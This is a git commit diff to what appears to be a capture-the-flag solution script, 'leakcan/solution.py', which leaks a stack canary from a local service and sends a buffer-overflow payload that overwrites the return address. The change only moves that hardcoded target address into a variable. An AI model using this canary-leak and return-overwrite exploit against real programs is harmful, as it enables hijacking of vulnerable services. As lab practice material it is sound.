baf5b676c8f3206ac406c4b5b0d56e1069c2a988
root <root@debian>
2025-02-21 11:14:07 +0100

    small change

--- leakcan/solution.py
+++ leakcan/solution.py
@@ -10,6 +10,7 @@ remote_ip = 'localhost'
 remote_port = 1337
 
 buffer_len = 8 * 11
+addr_your_goal = 0x401339 # it depends.
 
 r = remote(remote_ip, remote_port)
 
@@ -22,7 +23,7 @@ x = r.recv() # Receive canary;
 canary = x[x.rfind(b'A')+1:x.rfind(b'A')+9] # Canary leak
 
 
-exploit = b"A" * buffer_len + b"\x00" + canary[1:] + 8 * b"\x00" + p64(0x401339) # Overwrite buffer followed by canary, rbp and return address which is not position independent;
+exploit = b"A" * buffer_len + b"\x00" + canary[1:] + 8 * b"\x00" + p64(addr_your_goal) # Overwrite buffer followed by canary, rbp and return address which is not position independent;
 
 r.send(exploit) # Sending payload;
 
